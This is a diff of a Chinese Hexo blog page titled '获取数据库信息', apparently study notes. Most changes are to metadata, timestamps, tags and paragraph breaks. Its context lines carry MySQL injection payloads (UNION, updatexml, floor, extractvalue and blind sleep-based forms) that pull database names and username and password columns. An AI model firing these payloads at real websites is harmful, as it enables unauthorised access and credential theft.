@@ -20,15 +20,16 @@
     <meta name="theme-color" content="#3F51B5">
     
     
-    <meta name="keywords" content="">
+    <meta name="keywords" content="SQL注入,数据库">
     <meta name="description" content="mysql数据库常用函数: system_user()系统用户名  users()用户名  current_user()当前用户名  session_user()连接数据库的用户名  database() 数据库名  version() MYSQL数据库版本  @@datadir 读取数据库路径  @@basedir MYSQL安装路径  @@version_compile_os 操作系统  co">
+<meta name="keywords" content="SQL注入,数据库">
 <meta property="og:type" content="article">
 <meta property="og:title" content="获取数据库信息">
 <meta property="og:url" content="https:&#x2F;&#x2F;adad456.github.io&#x2F;2019&#x2F;10&#x2F;17&#x2F;%E8%8E%B7%E5%8F%96%E6%95%B0%E6%8D%AE%E5%BA%93%E4%BF%A1%E6%81%AF&#x2F;index.html">
 <meta property="og:site_name" content="Adad456">
 <meta property="og:description" content="mysql数据库常用函数: system_user()系统用户名  users()用户名  current_user()当前用户名  session_user()连接数据库的用户名  database() 数据库名  version() MYSQL数据库版本  @@datadir 读取数据库路径  @@basedir MYSQL安装路径  @@version_compile_os 操作系统  co">
 <meta property="og:locale" content="zh-CN">
-<meta property="og:updated_time" content="2019-10-16T12:37:34.401Z">
+<meta property="og:updated_time" content="2019-10-17T08:46:56.337Z">
 <meta name="twitter:card" content="summary">
     
         <link rel="alternate" type="application/atom+xml" title="Adad456" href="/atom.xml">
@@ -131,10 +132,12 @@
         <h1 class="title">获取数据库信息</h1>
         <h5 class="subtitle">
             
-                <time datetime="2019-10-17T08:41:12.413Z" itemprop="datePublished" class="page-time">
+                <time datetime="2019-10-17T08:44:05.000Z" itemprop="datePublished" class="page-time">
   2019-10-17
 </time>
 
+
+	<ul class="article-category-list"><li class="article-category-list-item"><a class="article-category-list-link" href="/categories/web%E5%AE%89%E5%85%A8/">web安全</a></li></ul>
 
             
         </h5>
@@ -155,9 +158,11 @@
     <div class="post-card">
         <h1 class="post-card-title">获取数据库信息</h1>
         <div class="post-meta">
-            <time class="post-time" title="2019-10-17 16:41:12" datetime="2019-10-17T08:41:12.413Z"  itemprop="datePublished">2019-10-17</time>
+            <time class="post-time" title="2019-10-17 16:44:05" datetime="2019-10-17T08:44:05.000Z"  itemprop="datePublished">2019-10-17</time>
 
             
+	<ul class="article-category-list"><li class="article-category-list-item"><a class="article-category-list-link" href="/categories/web%E5%AE%89%E5%85%A8/">web安全</a></li></ul>
+
 
 
             
@@ -210,12 +215,15 @@ regexp、like语句</code></pre><p>#UNION SELECT</p>
 <pre><code>id=-1&apos; and union select 1,2,group_concat(schema_name) from information_schema.schemata --+</code></pre><p><em>查询表名：</em></p>
 <pre><code>id=-1&apos; and union select 1,2,group_concat(table_name) from information_schema.tables where table_schema=database() --+</code></pre><p><em>查询列名：</em></p>
 <pre><code>id=-1&apos; union select 1,2,group_concat(column_name) from information_schema.columns where table_name=&apos;users&apos; --+</code></pre><p><em>查询字段值：</em></p>
-<pre><code>id=-1&apos; union select 1,2,group_concat(id,username,password) from users--+</code></pre><p>#基于报错注入<br>##updatexml报错注入<br><strong>updatexml(XML_document,XPath_String,new_value)</strong></p>
+<pre><code>id=-1&apos; union select 1,2,group_concat(id,username,password) from users--+</code></pre><p>#基于报错注入</p>
+<p>##updatexml报错注入</p>
+<p><strong>updatexml(XML_document,XPath_String,new_value)</strong></p>
 <p><em>获取数据库名、版本信息：</em></p>
 <pre><code>id=1&apos; and updatexml(1,concat(0x23,database(),0x23,version(),0x23),1)--+</code></pre><p><em>获取表名：</em></p>
 <pre><code>id=1&apos; and updatexml(1,concat(0x23,(select group_concat(table_name) from information_schema.tables where table_schema=database()),0x23),1)--+</code></pre><p><em>获取列名：</em></p>
 <pre><code>id=1&apos; and updatexml(1,concat(0x23,(select group_concat(column_name) from information_schema.columns where table_name=&apos;users&apos;),0x23),1)--+</code></pre><p><em>获取表users()中的用户名和密码：</em></p>
-<pre><code>id=1&apos; and updatexml(1,concat(0x23,(select group_concat(username,0x23,password) from security.users)),1)--+</code></pre><p>##floor报错注入<br><strong>floor(rand(0)*2)</strong></p>
+<pre><code>id=1&apos; and updatexml(1,concat(0x23,(select group_concat(username,0x23,password) from security.users)),1)--+</code></pre><p>##floor报错注入</p>
+<p><strong>floor(rand(0)*2)</strong></p>
 <p><em>爆库：</em></p>
 <pre><code>id=1&apos; and (select 1 from (select count(*),concat(0x23,database(),0x23,floor(rand(0)*2)) as x from information_schema.tables group by x) as y)--+爆库
 或：
@@ -224,12 +232,14 @@ id=1&apos; union select 1 from (select count(*),concat(0x23,database(),0x23,floo
 id=1&apos; union select 1,2,count(*) from information_schema.columns group by concat(version(),floor(rand(0)*2)) --+</code></pre><p><em>爆表：</em></p>
 <pre><code>id=1&apos; and (select 1 from (select count(*),concat(0x23,(select concat(table_name) from information_schema.tables where table_schema=database() limit 3,1),0x23,floor(rand(0)*2)) as x from information_schema.tables group by y) as a) --+</code></pre><p><em>爆列名：</em></p>
 <pre><code>id=1&apos; and (select 1 from (select count(*),concat(0x23,(select concat(column_name) from information_schema.columns where table_name=&apos;users&apos; limit 5,1),0x23,floor(rand(0)*2)) as x from information_schema.tables group by x) as a)--+</code></pre><p><em>爆字段值:</em></p>
-<pre><code>id=1&apos; and (select 1 from (select count(*),concat(0x23,(select concat(username,&apos;:&apos;,password) from security.users limit 0,1),0x23,floor(rand(0)*2)) as x from information_schema.tables group by x) as a)--+</code></pre><p>##extractvalue报错注入<br><strong>extractvalue(xml_frag, xpath_expr)</strong></p>
+<pre><code>id=1&apos; and (select 1 from (select count(*),concat(0x23,(select concat(username,&apos;:&apos;,password) from security.users limit 0,1),0x23,floor(rand(0)*2)) as x from information_schema.tables group by x) as a)--+</code></pre><p>##extractvalue报错注入</p>
+<p><strong>extractvalue(xml_frag, xpath_expr)</strong></p>
 <p><em>爆库：</em></p>
 <pre><code>id=1&apos; and extractvalue(1,concat_ws(0x23,user(),version(),database(),@@version_compile_os))--+</code></pre><p><em>爆表：</em></p>
 <pre><code>id=1&apos; and extractvalue(1,concat(0x23,(select group_concat(table_name) from information_schema.tables where table_schema=database())))--+</code></pre><p><em>爆列名:</em></p>
 <pre><code>id=1&apos; and extractvalue(1,concat(0x23,(select group_concat(column_name) from information_schema.columns where table_name=&apos;users&apos;)))--+</code></pre><p><em>爆字段：</em></p>
-<pre><code>id=1&apos; and extractvalue(1,(select group_concat(username,&apos;:&apos;,password) from users))--+</code></pre><p>#盲注<br>##基于布尔的盲注</p>
+<pre><code>id=1&apos; and extractvalue(1,(select group_concat(username,&apos;:&apos;,password) from users))--+</code></pre><p>#盲注</p>
+<p>##基于布尔的盲注</p>
 <pre><code>ascii()返回指定字符串最左侧字符的ascii值
 count()计算结果集的数量
 length()返回指定字符串的长度
@@ -281,7 +291,7 @@ id=1&apos; and if(ascii(substr(version(),1,1))=114,sleep(3),1)查看数据库版
     <div class="content">
         
 <span class="post-time">
-    最后更新时间：<time datetime="2019-10-16T12:37:34.401Z" itemprop="dateUpdated">2019-10-16 20:37:34</time>
+    最后更新时间：<time datetime="2019-10-17T08:46:56.337Z" itemprop="dateUpdated">2019-10-17 16:46:56</time>
 </span><br>
 
 
@@ -301,6 +311,8 @@ id=1&apos; and if(ascii(substr(version(),1,1))=114,sleep(3),1)查看数据库版
 
         <div class="post-footer">
             
+	<ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/SQL%E6%B3%A8%E5%85%A5/" rel="tag">SQL注入</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/%E6%95%B0%E6%8D%AE%E5%BA%93/" rel="tag">数据库</a></li></ul>
+
 
             
 
@@ -309,19 +321,6 @@ id=1&apos; and if(ascii(substr(version(),1,1))=114,sleep(3),1)查看数据库版
     </div>
 
     
-<nav class="post-nav flex-row flex-justify-between flex-row-reverse">
-  
-
-  
-    <div class="waves-block waves-effect next">
-      <a href="/2019/10/16/hello-world/" id="post-next" class="post-nav-link">
-        <div class="tips">Next <i class="icon icon-angle-right icon-lg icon-pl"></i></div>
-        <h4 class="title">Hello World</h4>
-      </a>
-    </div>
-  
-</nav>
-
 
 
     
